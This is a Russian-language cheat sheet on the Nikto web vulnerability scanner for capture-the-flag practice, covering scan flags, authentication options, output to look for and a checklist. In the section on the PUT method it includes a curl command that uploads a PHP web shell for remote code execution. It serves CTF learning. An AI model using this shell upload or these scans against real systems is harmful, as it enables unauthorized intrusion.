[!] NIKTO CHEATSHEET: CTF EDITION
[!] Цель: Быстро найти зацепки (чувствительные файлы, устаревшее ПО, дефолтные креды, нестандартные методы)

1. БАЗОВЫЙ СКАН (ПОРТ 80)
   -----------------------
   -> Самое частое: просто проверяем хост
   nikto -h http://10.10.10.10

   -> Если сайт на другом порту (например, 8080, 8180)
   nikto -h 10.10.10.10 -p 8180

   -> HTTPS (обязательно указываем, иначе может не работать)
   nikto -h https://10.10.10.10 -ssl -port 443

2. BASIC AUTH (КРЕДЫ ЕСТЬ)
   ------------------------
   -> Если нашли логин/пароль в конфигах или сниффе
   nikto -h http://10.10.10.10 -id admin:password123

   -> Digest auth (редко, но бывает)
   nikto -h http://10.10.10.10 -id admin:password123 -digest

   -> Только конкретная папка под защитой (экономия времени)
   nikto -h http://10.10.10.10/secret/ -id admin:password123

   -> Авторизация через куку (если залогинились вручную)
   nikto -h http://10.10.10.10 -Cookie "PHPSESSID=abc123"

3. ПОЛЕЗНЫЕ ФЛАГИ ДЛЯ CTF
   -----------------------
   -> Сканировать конкретный путь (если нашли что-то интересное)
   nikto -h http://10.10.10.10 -c /uploads

   -> Сохранить отчет (чтобы потом не пересканивать)
   nikto -h http://10.10.10.10 -o scan_results.txt

   -> Формат вывода (по умолчанию txt, можно csv/html)
   nikto -h http://10.10.10.10 -o report.html -Format html

   -> Игнорировать коды 404 (меньше мусора)
   nikto -h http://10.10.10.10 -no404

   -> Увеличить таймаут (если сайт тормозной)
   nikto -h http://10.10.10.10 -timeout 10

4. ЧТО ИЩЕМ В ВЫВОДЕ (КЛЮЧЕВЫЕ СЛОВА)
   ------------------------------------
   [+] Server: ... -> Версия Apache/nginx/IIS — гуглим уязвимости
   [+] /robots.txt -> Может быть закрытые директории
   [+] /phpinfo.php -> Иногда валяется, дает кучу инфы
   [+] /backup/, /.git/, /.svn/ -> Утечка исходников
   [+] admin : admin -> Дефолтные креды в выводе
   [+] Allowed HTTP Methods: PUT, DELETE -> Может, зальем шелл? [citation:4]
   [+] OSVDB-... -> Номер уязвимости, гуглим сразу
   [+] 200 OK -> Нашли что-то существующее
   [+] Unauthorized (401) -> Требуется авторизация (пробуем -id)

5. ТИПИЧНЫЕ СЦЕНАРИИ ДЛЯ CTF
   --------------------------
   А) НАШЛИ PUT
      -> Nikto выдал: "Allowed HTTP Methods: PUT"
      -> Действие: Пробуем загрузить шелл через curl
        curl -X PUT -d '<?php system($_GET["cmd"]); ?>' http://10.10.10.10/shell.php
      -> Profit: RCE

   Б) НАШЛИ СТАРУЮ ВЕРСИЮ (например, Apache 2.2.3)
      -> Nikto: "Server: Apache/2.2.3"
      -> Гуглим: "Apache 2.2.3 exploit cve"
      -> Находим готовый эксплоит

   В) /ROBOTS.TXT УКАЗЫВАЕТ НА /SECRET
      -> Nikto: "/robots.txt contains 1 entry: '/secret'"
      -> Идем в /secret — может быть админка или зашифрованный флаг

   Г) НЕСКОЛЬКО ХОСТОВ В ФАЙЛЕ
      -> Создаем targets.txt с IP-адресами
      nikto -h targets.txt

6. АНАЛИЗ PCAP (ЕСЛИ ДАЛИ ФАЙЛ ТРАФИКА)
   --------------------------------------
   -> В Wireshark: фильтр по IP атакующего и HTTP
        ip.addr == 10.10.10.10 and http
   -> Видим кучу мусорных запросов — это Nikto
   -> Можем сказать, что использовали Nikto для разведки [citation:1]

7. ЧТО ДЕЛАТЬ, ЕСЛИ NIKTO НИЧЕГО НЕ НАШЕЛ
   ----------------------------------------
   -> Проверь порт (может, сайт на 8080, а ты долбишь в 80)
   -> Проверь HTTPS (может, http редиректит на https, а сканер не идет)
   -> Проверь robots.txt руками
   -> Запусти dirb/gobuster (Nikto ищет уязвимости, а не только директории)
   -> Проверь заголовки руками через curl -I

8. ПРИМЕР ПОЛНОГО СКАНА (ВСЕ В ОДНОМ)
   ------------------------------------
   nikto -h https://target.com -ssl -p 443 -id admin:pass -o full_scan.txt -no404

ЧЕКЛИСТ (КОПИРУЙ В БЛОКНОТ):
   [ ] Какой порт? (80, 443, 8080, 8443, 8180?)
   [ ] Есть базовая авторизация? (-id)
   [ ] Разрешен ли PUT?
   [ ] Есть robots.txt с закрытыми путями?
   [ ] Есть phpinfo?
   [ ] Какая версия сервера? (ищем эксплоиты)
   [ ] Есть ли папки вроде /backup, /.git, /.svn?
   [ ] Сохранил вывод? (-o)

-> Nikto НЕ находит всё. Он ищет известные уязвимости и дефолтные файлы. Для глубокого поиска директорий используй dirb/gobuster/ffuf. [citation:4]
-> Если сканируешь через VPN/tor, добавь -timeout 20 (может тормозить)
-> Если сайт падает от нагрузки — не вини Nikto, вини кривой код сайта

[!] Always check: robots.txt (иногда там флаг лежит прямо в комментах)
[!] Always check: Server header (версия = гуглим сплоит)
[!] Always check: HTTP methods (OPTIONS запросом смотрим, что разрешено)
[!] Always check: / (главная страница) — иногда флаг в HTML-комментариях
